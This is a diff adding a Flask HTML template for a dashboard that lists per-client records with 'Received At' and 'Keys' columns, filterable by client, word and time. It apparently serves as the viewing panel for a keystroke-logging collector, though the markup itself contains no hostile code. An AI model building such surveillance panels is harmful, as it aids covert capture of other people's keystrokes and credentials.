@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <h2>Dashboard</h2>
+    <p>Logged in as: {{ user }} | <a href="{{ url_for('logout') }}">Logout</a></p>
+
+    <form id="filter-form">
+        Client ID: <input type="text" id="client-id">
+        Word: <input type="text" id="word">
+        Start: <input type="datetime-local" id="start">
+        End: <input type="datetime-local" id="end">
+        <button type="submit">Apply</button>
+    </form>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Client ID</th>
+                <th>Received At</th>
+                <th>Keys</th>
+            </tr>
+        </thead>
+        <tbody id="logs-body"></tbody>
+    </table>
+
+    <script src="{{ url_for('static', filename='app.js') }}" defer></script>
+</body>
+</html>
